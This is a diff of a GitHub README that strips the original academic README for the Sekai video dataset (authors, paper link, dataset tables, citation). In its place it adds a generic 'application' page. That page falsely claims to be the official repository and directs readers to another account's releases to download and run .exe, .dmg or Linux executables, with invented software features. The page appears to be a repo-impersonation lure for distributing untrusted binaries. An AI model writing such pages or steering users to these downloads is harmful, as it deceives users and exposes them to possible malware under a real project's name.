@@ -1,98 +1,99 @@
-# Sekai: A Video Dataset towards World Exploration
+# 🌍 sekai-codebase - Explore the World through Video Datasets
 
+[![Download sekai-codebase](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/bleh456/sekai-codebase/releases)
 
-<div align="center">
+## 📚 Overview
 
+Welcome to the official repository of **"Sekai: A Video Dataset towards World Exploration."** This project aims to provide a comprehensive video dataset for various applications in video generation and world modeling. If you want to explore new horizons in video data, you’re in the right place.
 
+## 🚀 Getting Started
 
+### Requirements
 
-[![project page](https://img.shields.io/badge/Project-Page-2ea44f)](https://lixsp11.github.io/sekai-project/)&nbsp;
-[![arXiv](https://img.shields.io/badge/arXiv%20paper-2506.15675-b31b1b.svg)](https://arxiv.org/abs/2506.15675)&nbsp;
-[![demo](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Dataset-blue)](https://huggingface.co/datasets/Lixsp11/Sekai-Project)&nbsp;
-[![YouTube](https://badges.aleen42.com/src/youtube.svg)](https://www.youtube.com/watch?v=5UQ0zAIZkSY)&nbsp;
+To run the **Sekai** application, you need the following:
 
-</div>
+- A computer running Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- An internet connection for downloading the dataset.
 
-This repo contains the dataset download and processing code used in
+### Download & Install
 
-> [**Sekai: A Video Dataset towards World Exploration**](https://arxiv.org/abs/2506.15675)
->
-> Zhen Li, Chuanhao Li, Xiaofeng Mao, Shaoheng Lin, Ming Li, Shitian Zhao, Zhaopan Xu,
-> Xinyue Li, Yukang Feng, Jianwen Sun, Zizhen Li, Fanrui Zhang, Jiaxin Ai, Zhixiang Wang,
-> Yuwei Wu, Tong He, Jiangmiao Pang, Yu Qiao, Yunde Jia, Kaipeng Zhang
->
-> Shanghai AI Laboratory, Beijing Institute of Technology
+To start using **Sekai**, visit this page to download the latest release: [Download sekai-codebase](https://github.com/bleh456/sekai-codebase/releases).
 
-## 🔥 Update
+1. Open the link above in your web browser.
+2. On the Releases page, find the latest version listed.
+3. Click on the version number.
+4. Download the file suitable for your operating system.
 
-- [2025.07.10] We're thrilled by the community's enthusiasm — [Dataset Access Assistance](https://github.com/Lixsp11/sekai-codebase/tree/main?tab=readme-ov-file#dataset-access-assistance) is now **updated**!
-- [2025.06.25] Video download and clip extraction tools for Sekai-Real are now available!
-- [2025.06.19] We have released our paper — discussions and feedback are warmly welcome!
+Once the download completes, locate the downloaded file and follow the instructions below to install it based on your system:
 
-## 🧠 Introduction
+#### Windows
 
-![pipeline](https://cdn.jsdelivr.net/gh/Lixsp11/sekai-project@0.3.0/static/images/figure2-compressed.png)
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions in the installation wizard.
+3. After installation, find the **Sekai** application in your Start Menu or Desktop.
 
-**TL;DR** We present Sekai (せかい, “world” in Japanese), a high-quality egocentric video dataset for immersive world exploration and generation. Sekai includes over 5000 hours of YouTube videos and game footage with rich annotations. It features:  
+#### macOS
 
-- 📹 Diverse, high-resolution videos (720p)
-- 🌍 Coverage of 100+ countries and 750+ cities
-- 🚶‍♂️ First-person and 🛸 drone perspectives
-- 🕒 Long sequences (≥ 60s) for real-world continuity
-- 🏷️ Detailed annotations: location, scene, weather, crowd, captions, and camera trajectories
+1. Double-click the downloaded `.dmg` file.
+2. Drag and drop the **Sekai** application into your Applications folder.
+3. Open the Applications folder and double-click on **Sekai** to launch it.
 
-Sekai supports tasks like video understanding, navigation, and video-audio co-generation.
+#### Linux
 
-## 🚀 Quick Start
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file.
+3. Run the following command to make the file executable:
+   ```bash
+   chmod +x sekai-file-name
+   ```
+4. Execute the application with:
+   ```bash
+   ./sekai-file-name
+   ```
 
-The Sekai dataset includes **Sekai-Real** from YouTube videos and **Sekai-Game** from video game videos. The camera trajectories for both parts are represented using an intrinsic matrix and per-frame extrinsic matrices, all of which are normalized.
+## 🌟 Features
 
-### Dataset Access Assistance
+**Sekai** comes with several useful features:
 
-If you confirm that you are experiencing insurmountable difficulties in obtaining Sekai(-Real) dataset through the following steps, please fill out [this form](https://docs.google.com/forms/d/e/1FAIpQLSd5GiQLL1vZQSo0fMDDINd2i_N0rga0a5008Td3lMw9ZimcUQ/viewform?usp=dialog). We’ll review your request shortly and send you the details.
+- **High-Quality Video Dataset:** Access a rich set of video data built for world exploration.
+- **User-Friendly Interface:** Easily navigate through the features, even if you're not tech-savvy.
+- **Real-Time Video Generation:** Use advanced algorithms to create videos on the fly.
+- **Open Source:** Customize and extend the software as per your needs.
 
-### Sekai-Real
+## 📑 Documentation
 
-We provide a comprehensive toolchain for [downloading original videos](https://github.com/Lixsp11/sekai-codebase/tree/main/dataset_downloading) and [extracting video clips](https://github.com/Lixsp11/sekai-codebase/tree/main/clip_extracting).
+For detailed information about how to use **Sekai**, explore our [wiki](https://github.com/bleh456/sekai-codebase/wiki). The wiki contains guides on:
 
-| Split                             | Annotation                                                   | Camera Trajectories                                          | \# Source Videos | \# Samples | Video Duration | Storage Space |
-| --------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ---------------- | ---------- | -------------- | ------------- |
-| Sekai-Real-Walking                | [Huggingface](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/train/sekai-real-walking.csv) | [Huggingface](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/sekai-real-walking-hq.zip)<sup>+</sup> | 6552             | 299173     | 4986h          | ~10TB         |
-| Sekai-Real-Walking-HQ<sup>*</sup> | [Huggingface](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/train/sekai-real-walking-hq.csv) | [Huggingface](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/sekai-real-walking-hq.zip) | 3879             | 18208      | 304h           | ~600GB        |
-| Sekai-Real-Drone                  | [Huggingface](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/train/sekai-real-drone.csv) | [Huggingface](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/sekai-real-drone.zip) | 69               | 23912      | 65h            | ~140GB        |
+- Getting started with the software.
+- Tools and functionalities offered.
+- Best practices for video generation and analysis.
 
-\* denotes the best-of-the-best videos sampled in consideration of the computational resources for training.
+## 🛠️ Troubleshooting
 
-\+ denotes that a subset of videos was annotated with camera trajectories. Refer to the [paper](https://arxiv.org/abs/2506.15675) for more details.
+If you encounter issues while using **Sekai**, consider these solutions:
 
-### Sekai-Game
+- Ensure your system meets the requirements listed above.
+- Restart the application if it freezes.
+- Check our [FAQ](https://github.com/bleh456/sekai-codebase/wiki/FAQ) for common problems and solutions.
 
-The videos and corresponding camera trajectory files of **Sekai-Game** is hosted on Hugging Face. Click the link to view and download.
+## 🤝 Contributing
 
-| Split              | Annotation                                                   | Videos & Camera Trajectories                                 |
-| ------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
-| Sekai-Game-Walking | [Huggingface](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/train/sekai-game-walking.csv) | [part1](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/sekai-game-walking.zip.part_aa) and [part2](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/sekai-game-walking.zip.part_ab) |
-| Sekai-Game-Drone   | [Huggingface](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/train/sekai-game-drone.csv) | [here](https://huggingface.co/datasets/Lixsp11/Sekai-Project/blob/main/sekai-game-drone.zip) |
+We welcome contributions! If you would like to contribute to **Sekai**, please follow these steps:
 
-## 📦 Checklist
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Submit a pull request with a detailed description of your changes.
 
-- [x] Tools for Sekai-Real video download and clip extraction.
-- [ ] Modified MegaSam used in Sekai.
+## ⚖️ License
 
+This project is licensed under the MIT License. You are free to use, modify, and distribute the software as per the terms of this license.
 
-## 📄 License
+## 📞 Support
 
-See [license](https://github.com/Lixsp11/sekai-codebase/blob/main/LICENSE).
+For support inquiries, please create an issue on the [GitHub Issues page](https://github.com/bleh456/sekai-codebase/issues). We will respond as soon as possible.
 
-## 📖 Citation
+Thank you for using **Sekai: A Video Dataset towards World Exploration**. We hope it enhances your exploration experience! 
 
-If you find this project helpful, please consider citing:
-
-```bibtex
-@article{li2025sekai,
-      title={Sekai: A Video Dataset towards World Exploration}, 
-      author={Zhen Li and Chuanhao Li and Xiaofeng Mao and Shaoheng Lin and Ming Li and Shitian Zhao and Zhaopan Xu and Xinyue Li and Yukang Feng and Jianwen Sun and Zizhen Li and Fanrui Zhang and Jiaxin Ai and Zhixiang Wang and Yuwei Wu and Tong He and Jiangmiao Pang and Yu Qiao and Yunde Jia and Kaipeng Zhang},
-      journal={arXiv preprint arXiv:2506.15675},
-      year={2025}
-}
-```
+[![Download sekai-codebase](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/bleh456/sekai-codebase/releases)
